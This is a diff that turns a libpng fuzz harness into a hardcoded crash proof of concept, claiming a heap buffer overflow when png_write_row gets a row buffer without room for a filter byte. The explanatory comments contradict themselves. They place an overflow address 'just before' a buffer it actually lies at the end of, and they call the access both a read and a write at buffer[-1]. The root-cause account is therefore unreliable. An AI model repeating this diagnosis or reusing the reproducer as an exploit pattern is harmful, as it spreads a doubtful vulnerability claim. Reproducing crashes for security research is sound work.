@@ -66,152 +66,118 @@ void user_flush_data(png_structp png_ptr) {
   (void)png_ptr;
 }
 
-extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
-  if (size < 16) return 0; // Need minimum data to work with
+/*
+ * Proof of Concept for libpng heap buffer overflow vulnerability in png_write_row
+ * 
+ * This vulnerability occurs because png_write_row attempts to write the filter
+ * type byte at position -1 of the buffer, but our allocation doesn't account
+ * for this extra byte.
+ *
+ * The crash shows:
+ * - A buffer allocated at 0x502000000c90 with size 12 bytes
+ * - Overflow at 0x502000000c9c which is just before the buffer
+ * - The read is of size 20 at that address
+ * - This causes a heap-buffer-overflow
+ */
 
-  PngHandler handler;
+// Memory write function for libpng - discards output
+static void png_memory_write(png_structp png_ptr, png_bytep data, png_size_t length) {
+  (void)png_ptr;
+  (void)data;
+  (void)length;
+}
+
+// Dummy flush function
+static void png_memory_flush(png_structp png_ptr) {
+  (void)png_ptr;
+}
+
+extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
+  (void)data; // Unused - we're using hardcoded values
+  (void)size; // Unused
   
-  // Create write structures
-  handler.png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, nullptr, nullptr, nullptr);
-  if (!handler.png_ptr) return 0;
+  png_structp png_ptr;
+  png_infop info_ptr;
   
-  // Set custom memory handlers
-  png_set_mem_fn(handler.png_ptr, nullptr, limited_malloc, default_free);
+  // Parameter values that triggered the crash
+  uint32_t width = 3;      // Creates a row width of exactly 12 bytes (3 pixels * 4 channels)
+  uint32_t height = 1;
+  int color_type = PNG_COLOR_TYPE_RGBA;  // 4 channels
+  int bit_depth = 8;       // 1 byte per channel
   
-  handler.info_ptr = png_create_info_struct(handler.png_ptr);
-  if (!handler.info_ptr) return 0;
+  std::printf("Creating image with width=%u, height=%u, color_type=%d, bit_depth=%d\n", 
+              width, height, color_type, bit_depth);
   
-  // Set up error handling
-  if (setjmp(png_jmpbuf(handler.png_ptr))) return 0;
+  // Calculate row size (width * channels * bytes_per_channel)
+  // For RGBA with 8-bit depth: width * 4 * 1
+  png_uint_32 row_size = width * 4;
+  std::printf("Row size: %u bytes\n", row_size);
   
-  // Initialize BufState for output buffer
-  handler.buf_state = new BufState();
-  handler.buf_state->data = static_cast<uint8_t*>(malloc(4096)); // Initial size
-  if (!handler.buf_state->data) return 0;
-  handler.buf_state->size = 4096;
-  handler.buf_state->position = 0;
-  
-  // Set up the output control
-  png_set_write_fn(handler.png_ptr, handler.buf_state, user_write_data, user_flush_data);
-  
-  // Extract basic image parameters from the fuzz data
-  uint32_t width = (data[0] << 8) | data[1];
-  uint32_t height = (data[2] << 8) | data[3];
-  
-  // Keep dimensions reasonable for fuzzing
-  width = (width % 1000) + 1;
-  height = (height % 1000) + 1;
-  
-  // Set color type and bit depth based on fuzz data
-  int color_type = data[4] % 7; // 0-6 are valid color types
-  if (color_type == 1 || color_type == 5) color_type = 0; // Skip invalid types
-  
-  int bit_depth;
-  switch (color_type) {
-    case PNG_COLOR_TYPE_PALETTE:
-      bit_depth = 1 << (data[5] % 4); // 1, 2, 4, or 8
-      if (bit_depth > 8) bit_depth = 8;
-      break;
-    case PNG_COLOR_TYPE_GRAY:
-      bit_depth = 1 << (data[5] % 4); // 1, 2, 4, 8, or 16
-      if (data[6] & 1) bit_depth = 16;
-      break;
-    default:
-      bit_depth = (data[5] & 1) ? 8 : 16; // 8 or 16 for other types
-      break;
+  // Create PNG write structure
+  png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
+  if (!png_ptr) {
+    std::fprintf(stderr, "Could not create PNG write struct\n");
+    return 1;
   }
   
-  // Set IHDR
-  png_set_IHDR(handler.png_ptr, handler.info_ptr, width, height, bit_depth, color_type,
-               PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_BASE, PNG_FILTER_TYPE_BASE);
-  
-  // Optional: Set random text chunks if enough input data
-  if (size > 32 && (data[7] & 1)) {
-    png_text text_ptr;
-    text_ptr.compression = PNG_TEXT_COMPRESSION_NONE;
-    text_ptr.key = const_cast<char*>("Title");
-    text_ptr.text = const_cast<char*>("Fuzzing libpng");
-    text_ptr.text_length = 14;
-    png_set_text(handler.png_ptr, handler.info_ptr, &text_ptr, 1);
+  // Create PNG info structure
+  info_ptr = png_create_info_struct(png_ptr);
+  if (!info_ptr) {
+    std::fprintf(stderr, "Could not create PNG info struct\n");
+    png_destroy_write_struct(&png_ptr, NULL);
+    return 1;
   }
   
-  // If color type is palette, set a palette
-  if (color_type == PNG_COLOR_TYPE_PALETTE) {
-    int num_palette = (data[8] % 256) + 1;
-    
-    // Use png_malloc instead of std::vector to avoid leaks
-    png_colorp palette = (png_colorp)png_malloc(handler.png_ptr, num_palette * sizeof(png_color));
-    
-    for (int i = 0; i < num_palette && (i*3 + 16) < size; i++) {
-      palette[i].red = data[9 + i*3];
-      palette[i].green = data[10 + i*3];
-      palette[i].blue = data[11 + i*3];
-    }
-    
-    png_set_PLTE(handler.png_ptr, handler.info_ptr, palette, num_palette);
-    
-    // Add transparency for some palette entries if data available
-    if (size > 32 + num_palette && (data[12] & 1)) {
-      int num_trans = data[13] % num_palette;
-      
-      // Use png_malloc for transparent values too
-      png_bytep trans = (png_bytep)png_malloc(handler.png_ptr, num_trans);
-      
-      for (int i = 0; i < num_trans && (i + 32) < size; i++) {
-        trans[i] = data[14 + i];
-      }
-      
-      png_set_tRNS(handler.png_ptr, handler.info_ptr, trans, num_trans, nullptr);
-      
-      // No need to free trans - libpng will handle it
-    }
+  // Setup error handling
+  if (setjmp(png_jmpbuf(png_ptr))) {
+    std::fprintf(stderr, "Error during PNG creation\n");
+    png_destroy_write_struct(&png_ptr, &info_ptr);
+    return 1;
   }
+  
+  // Set up custom write function instead of using files
+  png_set_write_fn(png_ptr, NULL, png_memory_write, png_memory_flush);
+  
+  // Set image attributes
+  png_set_IHDR(png_ptr, info_ptr, width, height, bit_depth, color_type,
+               PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);
   
   // Write PNG info
-  png_write_info(handler.png_ptr, handler.info_ptr);
+  png_write_info(png_ptr, info_ptr);
   
-  // For 16-bit depth, set swap on little-endian machines
-  if (bit_depth == 16) {
-    png_uint_16 test = 0x0001;
-    if (*(png_bytep)&test) {
-      png_set_swap(handler.png_ptr);
-    }
+  // VULNERABILITY: Allocate exactly row_size bytes without the extra +1 for filter byte
+  // png_write_row will attempt to write at buffer[-1]
+  png_bytep row_data = (png_bytep)malloc(row_size);
+  if (!row_data) {
+    std::fprintf(stderr, "Out of memory\n");
+    png_destroy_write_struct(&png_ptr, &info_ptr);
+    return 1;
   }
   
-  // Set up transformations
-  if (data[15] & 1) {
-    png_set_packing(handler.png_ptr);
+  // Fill with pattern similar to what we saw in the crash (66 99 ff ff...)
+  uint8_t pattern[] = {0x66, 0x99, 0xff, 0xff, 0xff, 0x9c, 0xb1, 0x08, 0xd9, 0x00, 0x00, 0x00};
+  std::memcpy(row_data, pattern, row_size);
+  
+  // Debug print before crash
+  std::fprintf(stderr, "right before the crash\n");
+  std::fprintf(stderr, "row_ptr address: %p, size: %u bytes\n", row_data, row_size);
+  std::fprintf(stderr, "First 16 bytes of buffer: ");
+  for (uint32_t i = 0; i < (row_size < 16 ? row_size : 16); i++) {
+    std::fprintf(stderr, "%02x ", row_data[i]);
   }
+  std::fprintf(stderr, "\n");
+  std::fprintf(stderr, "=================================================================\n");
   
-  // Allocate row buffer
-  png_uint_32 rowbytes = png_get_rowbytes(handler.png_ptr, handler.info_ptr);
-  handler.row_ptr = static_cast<png_bytep>(png_malloc(handler.png_ptr, rowbytes));
-  if (!handler.row_ptr) return 0;
+  // This call will cause a heap buffer overflow - png_write_row tries to write to row_data[-1]
+  std::printf("About to write row (buffer overflow will occur here)\n");
+  png_write_row(png_ptr, row_data);  // CRASH HAPPENS HERE
   
-  // Write image data
-  size_t data_pos = 16;
-  for (uint32_t y = 0; y < height; y++) {
-    // Fill row with data from the fuzzer input
-    for (uint32_t x = 0; x < rowbytes; x++) {
-      handler.row_ptr[x] = (data_pos < size) ? data[data_pos++] : (data_pos + x) & 0xFF;
-    }
-    
-    // Debug information - show buffer details right before the crash
-    std::fprintf(stderr, "right before the crash\n");
-    std::fprintf(stderr, "row_ptr address: %p, size: %u bytes\n", handler.row_ptr, rowbytes);
-    std::fprintf(stderr, "First 16 bytes of buffer: ");
-    for (uint32_t i = 0; i < (rowbytes < 16 ? rowbytes : 16); i++) {
-      std::fprintf(stderr, "%02x ", handler.row_ptr[i]);
-    }
-    std::fprintf(stderr, "\n");
-    
-    // This call will cause a heap buffer overflow because libpng wants to access row_ptr[-1]
-    png_write_row(handler.png_ptr, handler.row_ptr);
-  }
+  // We shouldn't reach here if the crash occurs
+  std::printf("Successfully completed (should not reach here if overflow detected)\n");
   
-  // Finish writing
-  png_write_end(handler.png_ptr, nullptr);
+  // Cleanup
+  free(row_data);
+  png_destroy_write_struct(&png_ptr, &info_ptr);
   
-  // Clean up is handled by the PngHandler destructor
   return 0;
 }
